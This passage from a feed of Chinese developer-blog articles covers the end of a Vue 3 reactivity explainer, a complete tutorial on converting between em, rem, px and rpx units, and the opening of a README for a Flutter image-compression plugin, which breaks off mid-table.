    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
      <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'__v_raw'</span>) <span class="hljs-keyword">return</span> target
      
      <span class="hljs-comment">// 第一次访问时才创建真正的响应式代理</span>
      <span class="hljs-keyword">if</span> (!proxyCache) {
        proxyCache = <span class="hljs-title function_">reactive</span>(target)
      }
      
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(proxyCache, key, receiver)
    },
    <span class="hljs-comment">// ... 其他操作</span>
  })
}
</code></pre>
<h2 data-id="heading-21">📈 <strong>响应式系统的监控与调试</strong></h2>
<h3 data-id="heading-22">14. <strong>开发工具集成</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// 响应式调试信息
function setupReactivityDebug() {
  // 1. 跟踪依赖关系
  const dependencyGraph = new Map()
  
  // 2. 性能监控
  const performance = {
    trackTime: 0,
    triggerTime: 0,
    effectCount: 0
  }
  
  // 3. 内存泄漏检测
  const effectRegistry = new WeakSet()
  
  return {
    // 暴露给 Vue DevTools 的接口
    inspect(target) {
      const depsMap = targetMap.get(target)
      return {
        deps: depsMap ? Array.from(depsMap.entries()) : [],
        rawValue: toRaw(target),
        isReactive: isReactive(target)
      }
    },
    
    // 性能分析
    getPerformance() {
      return { ...performance }
    },
    
    // 清理所有 effect
    disposeAll() {
      // 清理逻辑
    }
  }
}

// Vue DevTools 中的响应式面板可以看到：
// 1. 响应式对象的依赖图
// 2. 每个属性的依赖列表
// 3. Effect 的执行历史
// 4. 性能分析数据
</code></pre>
<h2 data-id="heading-23">🎓 <strong>总结：Vue 响应式系统的演进</strong></h2>
<h3 data-id="heading-24"><strong>Vue 2 到 Vue 3 的关键改进</strong>：</h3>
<ol>
<li><strong>底层实现</strong>：<code>Object.defineProperty</code> → <code>Proxy</code></li>
<li><strong>性能</strong>：递归初始化 → 惰性代理</li>
<li><strong>功能</strong>：不支持新增属性 → 完全支持</li>
<li><strong>类型支持</strong>：有限的类型推断 → 完整的 TypeScript 支持</li>
<li><strong>集合类型</strong>：不支持 Map/Set → 完整支持</li>
</ol>
<h3 data-id="heading-25"><strong>核心创新点</strong>：</h3>
<ul>
<li><strong>编译时优化</strong>：Patch Flags、Tree Flattening</li>
<li><strong>依赖收集粒度</strong>：组件级 → 属性级</li>
<li><strong>更新调度</strong>：同步更新 → 异步批量更新</li>
<li><strong>内存管理</strong>：WeakMap 自动垃圾回收</li>
</ul>
<h3 data-id="heading-26"><strong>设计哲学</strong>：</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 响应式系统的设计目标：</span>
<span class="hljs-number">1.</span> 透明性：开发者无需手动管理依赖
<span class="hljs-number">2.</span> 高效性：最小化的更新范围
<span class="hljs-number">3.</span> 一致性：同步的编程模型，异步的更新执行
<span class="hljs-number">4.</span> 渐进性：从简单到复杂的平滑过渡
<span class="hljs-number">5.</span> 可调试性：完整的开发工具支持

<span class="hljs-comment">// 这就是为什么 Vue 的响应式系统既强大又易用</span>
</code></pre>
<p>Vue 的响应式系统是其框架的核心，它巧妙地将<strong>声明式编程</strong>与<strong>高效的更新机制</strong>结合起来，为开发者提供了极佳的开发体验，同时保证了优秀的运行时性能。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[em,rem,px,rpx单位换算，你弄懂了吗？]]></title>    <link>https://juejin.cn/post/7592759140038000681</link>    <guid>https://juejin.cn/post/7592759140038000681</guid>    <pubDate>2026-01-08T09:01:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140038000681" data-draft-id="7592555965793124358" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="em,rem,px,rpx单位换算，你弄懂了吗？"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-08T09:01:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怪可爱的地球人"/> <meta itemprop="url" content="https://juejin.cn/user/4387527339288932"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            em,rem,px,rpx单位换算，你弄懂了吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4387527339288932/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怪可爱的地球人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:01:33.000Z" title="Thu Jan 08 2026 09:01:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、在网页上面的换算</h2>
<h4 data-id="heading-1">em与rem与px的换算</h4>
<h3 data-id="heading-2">em公式</h3>
<pre><code class="hljs language-js" lang="js">em × 父元素字体大小 = px
</code></pre>
<pre><code class="hljs language-js" lang="js">&lt;!-- 父元素：字体 20px --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"font-size: 20px"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 子元素：padding 1.25em --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding: 1.25em"</span>&gt;</span>
    内容
  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
</code></pre>
<p>计算：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">1.</span>25em × 20px = 25px
所以 padding = 25px
</code></pre>
<h6 data-id="heading-3">嵌套情况（多层父元素）</h6>
<pre><code class="hljs language-js" lang="js">&lt;div style=<span class="hljs-string">"font-size: 20px"</span>&gt;        &lt;!-- 最外层父元素 --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"font-size: 18px"</span>&gt;</span>      <span class="hljs-comment">&lt;!-- 中间父元素 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding: 1.25em"</span>&gt;</span>      <span class="hljs-comment">&lt;!-- 子元素 --&gt;</span>
      内容
    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/div&gt;
</code></pre>
<ul>
<li>子元素的 1.25em 相对于直接父元素（中间 div）</li>
<li>1.25em × 18px = 22.5px</li>
</ul>
<h3 data-id="heading-4">rem基础公式</h3>
<pre><code class="hljs language-js" lang="js">rem值*根元素字体大小=px值
</code></pre>
<h6 data-id="heading-5">默认情况</h6>
<p>浏览器根元素<code>（&lt;html&gt;）</code>的默认字体大小的16px。</p>
<p>所以</p>
<pre><code class="hljs language-js" lang="js">1rem=16px
</code></pre>
<h6 data-id="heading-6">常见换算</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa57f34bf08d4cee91b904cdc24ed708~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCq5Y-v54ix55qE5Zyw55CD5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467693&amp;x-signature=6B4%2B9uOF2eOaMlkC2DsH6V4W%2FDg%3D" alt="image.png" loading="lazy"/></p>
<h6 data-id="heading-7">快速换算方法</h6>
<pre><code class="hljs language-js" lang="js">rem 值 × <span class="hljs-number">16</span> = px 值
</code></pre>
<p>或者</p>
<pre><code class="hljs language-js" lang="js">px 值 ÷ <span class="hljs-number">16</span> = rem 值
</code></pre>
<h6 data-id="heading-8">实际应用</h6>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/* UnoCSS 类名 */</span>
leading-<span class="hljs-number">5</span>        → line-<span class="hljs-attr">height</span>: <span class="hljs-number">1.</span>25rem → 20px
p-<span class="hljs-number">4</span>              → <span class="hljs-attr">padding</span>: 1rem → 16px
p-<span class="hljs-number">5</span>              → <span class="hljs-attr">padding</span>: <span class="hljs-number">1.</span>25rem → 20px
w-<span class="hljs-number">10</span>             → <span class="hljs-attr">width</span>: <span class="hljs-number">2.</span>5rem → 40px
</code></pre>
<h6 data-id="heading-9">如果根元素字体大小被改了</h6>
<pre><code class="hljs language-js" lang="js">html {
  font-<span class="hljs-attr">size</span>: 20px;  <span class="hljs-comment">/* 不是默认的 16px */</span>
}
</code></pre>
<p>那么</p>
<pre><code class="hljs language-js" lang="js">1rem = 20px
<span class="hljs-number">1.</span>25rem = <span class="hljs-number">1.25</span> × <span class="hljs-number">20</span> = 25px  (不是 20px 了)
</code></pre>
<h3 data-id="heading-10">三种单位的区别：</h3>
<ol>
<li>px(像素)-绝对单位</li>
</ol>
<pre><code class="hljs language-js" lang="js">px = 固定像素值，不会变化
</code></pre>
<ol start="2">
<li>em（相对父元素）</li>
</ol>
<pre><code class="hljs language-js" lang="js">em × 父元素字体大小 = px
</code></pre>
<ol start="3">
<li>rem（Root Em）- 相对根元素</li>
</ol>
<pre><code class="hljs language-js" lang="js">rem = 相对于根元素（&lt;html&gt;）的字体大小
</code></pre>
<h2 data-id="heading-11">二、在小程序中换算</h2>
<p>rpx（responsive pixel）是微信小程序的响应式单位，不是标准css单位。</p>
<h6 data-id="heading-12">规则：</h6>
<pre><code class="hljs language-js" lang="js">屏幕宽度 = 750rpx
</code></pre>
<h6 data-id="heading-13">换算公式：</h6>
<pre><code class="hljs language-js" lang="js">1rpx = 屏幕宽度 ÷ <span class="hljs-number">750</span>
</code></pre>
<p>反过来</p>
<pre><code class="hljs language-js" lang="js">1px = <span class="hljs-number">750</span> ÷ 屏幕宽度 rpx
</code></pre>
<h4 data-id="heading-14">不同设备的换算</h4>
<h6 data-id="heading-15">iphone6（基础设备）</h6>
<pre><code class="hljs language-js" lang="js">屏幕宽度：375px
1rpx = 375px ÷ <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>5px
1px = 2rpx
</code></pre>
<h6 data-id="heading-16">iPhone6 Plus</h6>
<pre><code class="hljs language-js" lang="js">屏幕宽度：414px
1rpx = 414px ÷ <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>552px
1px ≈ <span class="hljs-number">1.</span>81rpx
</code></pre>
<h6 data-id="heading-17">iPhone X</h6>
<pre><code class="hljs language-js" lang="js">屏幕宽度：375px
1rpx = 375px ÷ <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>5px
1px = 2rpx
</code></pre>
<h6 data-id="heading-18">快速换算（以iPhone6为基准）</h6>
<p>常用换算</p>
<pre><code class="hljs language-js" lang="js">1px = 2rpx
10px = 20rpx
20px = 40rpx
50px = 100rpx
100px = 200rpx
</code></pre>
<h3 data-id="heading-19">注意事项</h3>
<h4 data-id="heading-20">1. rpx 只在微信小程序中使用</h4>
<ul>
<li>
<p>标准 CSS/HTML 不支持 rpx</p>
</li>
<li>
<p>UnoCSS 不支持 rpx</p>
</li>
<li>
<p>只在微信小程序、uni-app 等框架中使用</p>
</li>
</ul>
<h4 data-id="heading-21">2. 不同设备换算不同</h4>
<ul>
<li>
<p>iPhone6：1px = 2rpx</p>
</li>
<li>
<p>iPhone6 Plus：1px ≈ 1.81rpx</p>
</li>
<li>
<p>安卓：1px ≈ 2.08rpx</p>
</li>
<li>
<p>设计稿宽度用 750px</p>
</li>
<li>
<p>设计稿中的 px 值直接作为 rpx 值使用</p>
</li>
<li>
<p>例如：设计稿 100px → 代码 100rpx</p>
</li>
</ul>
<h6 data-id="heading-22">实际开发中的话，小程序以iphone6/7/8为基准设备。</h6>
<pre><code class="hljs language-js" lang="js">iPhone6/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>
屏幕宽度：375px
屏幕高度：667px
</code></pre>
<h4 data-id="heading-23">设计稿标准</h4>
<pre><code class="hljs language-js" lang="js">设计稿宽度：750px（<span class="hljs-number">2</span>倍图）
设计稿高度：1334px（<span class="hljs-number">2</span>倍图）
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Luban 2 Flutter：一行代码在 Flutter 开发中实现图片压缩功能]]></title>    <link>https://juejin.cn/post/7592765004807667763</link>    <guid>https://juejin.cn/post/7592765004807667763</guid>    <pubDate>2026-01-08T08:56:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592765004807667763" data-draft-id="7592816646869925897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Luban 2 Flutter：一行代码在 Flutter 开发中实现图片压缩功能"/> <meta itemprop="keywords" content="Flutter,iOS"/> <meta itemprop="datePublished" content="2026-01-08T08:56:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小熊码匠"/> <meta itemprop="url" content="https://juejin.cn/user/1585942854909582"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Luban 2 Flutter：一行代码在 Flutter 开发中实现图片压缩功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1585942854909582/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小熊码匠
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:56:59.000Z" title="Thu Jan 08 2026 08:56:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Luban 2 Flutter —— 高效简洁的 Flutter 图片压缩插件，像素级还原微信朋友圈压缩策略。</p>
<h2 data-id="heading-0">📑 目录</h2>
<ul>
<li><a href="#-%E9%A1%B9%E7%9B%AE%E6%8F%8F%E8%BF%B0" title="#-%E9%A1%B9%E7%9B%AE%E6%8F%8F%E8%BF%B0">📖 项目描述</a></li>
<li><a href="#-%E7%89%B9%E6%80%A7" title="#-%E7%89%B9%E6%80%A7">✨ 特性</a></li>
<li><a href="#-%E6%95%88%E6%9E%9C%E4%B8%8E%E5%AF%B9%E6%AF%94" title="#-%E6%95%88%E6%9E%9C%E4%B8%8E%E5%AF%B9%E6%AF%94">📊 效果与对比</a>
<ul>
<li><a href="#-%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95%E7%89%B9%E6%80%A7" title="#-%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95%E7%89%B9%E6%80%A7">🔬 核心算法特性</a></li>
</ul>
</li>
<li><a href="#-%E5%AE%89%E8%A3%85" title="#-%E5%AE%89%E8%A3%85">📦 安装</a></li>
<li><a href="#-%E4%BD%BF%E7%94%A8" title="#-%E4%BD%BF%E7%94%A8">💻 使用</a>
<ul>
<li><a href="#%E5%8E%8B%E7%BC%A9%E5%8D%95%E5%BC%A0%E5%9B%BE%E7%89%87" title="#%E5%8E%8B%E7%BC%A9%E5%8D%95%E5%BC%A0%E5%9B%BE%E7%89%87">压缩单张图片</a></li>
<li><a href="#%E6%89%B9%E9%87%8F%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87" title="#%E6%89%B9%E9%87%8F%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87">批量压缩图片</a></li>
</ul>
</li>
<li><a href="#-%E6%8D%90%E5%8A%A9" title="#-%E6%8D%90%E5%8A%A9">☕ 捐助</a></li>
<li><a href="#-license" title="#-license">📄 License</a></li>
</ul>
<h2 data-id="heading-1">📖 项目描述</h2>
<p>开源地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fcurzbin%2Fflutter_luban" target="_blank" title="https://gitee.com/curzbin/flutter_luban" ref="nofollow noopener noreferrer">Gitee</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCurzibn%2Fflutter_luban" target="_blank" title="https://github.com/Curzibn/flutter_luban" ref="nofollow noopener noreferrer">Github</a></p>
<p>目前做 <code>App</code> 开发总绕不开图片这个元素。但是随着手机拍照分辨率的提升，图片的压缩成为一个很重要的问题。单纯对图片进行裁切，压缩已经有很多文章介绍。但是裁切成多少，压缩成多少却很难控制好，裁切过头图片太小，质量压缩过头则显示效果太差。</p>
<p>于是自然想到 <code>App</code> 巨头"微信"会是怎么处理，<code>Luban</code>（鲁班）就是通过在微信朋友圈发送近100张不同分辨率图片，对比原图与微信压缩后的图片逆向推算出来的压缩算法。</p>
<p>因为是逆向推算，效果还没法跟微信一模一样，但是已经很接近微信朋友圈压缩后的效果，具体看以下对比！</p>
<p>本库是 <code>Luban</code> 的 <strong>Flutter 版本</strong>，使用 <strong>TurboJPEG</strong> 进行高性能图片压缩，提供简洁易用的 API 和接近微信朋友圈的压缩效果。</p>
<h2 data-id="heading-2">📊 效果与对比</h2>















































<table><thead><tr><th align="left">图片类型</th><th align="left">原图（分辨率, 大小）</th><th align="left">Luban（分辨率, 大小）</th><th align="left">Wechat（分辨率, 大小）</th></tr></thead><tbody><tr><td align="left"><strong>标准拍照</strong></td><td align="left">3024×4032, 5.10MB</td><td align="left">1440×1920, 305KB</td><td align="left">1440×1920, 303KB</td></tr><tr><td align="left"><strong>高清大图</strong></td><td align="left">4000×6000, 12.10MB</td><td align="left">1440×2160, 318KB</td><td align="left">1440×2160, 305KB</td></tr><tr><td align="left"><strong>2K 截图</strong></td><td align="left">1440×3200, 2.10MB</td><td align="left">1440×3200, 148KB</td><td align="left">1440×3200, 256KB</td></tr><tr><td align="left"><strong>超长记录</strong></td><td align="left">1242×22080, 6.10MB</td><td align="left">758×13490, 290KB</td><td align="left">744×13129, 256KB</td></tr><tr><td align="left"><strong>全景横图</strong></td><td align="left">12000×5000, 8.10MB</td><td align="left">1440×600, 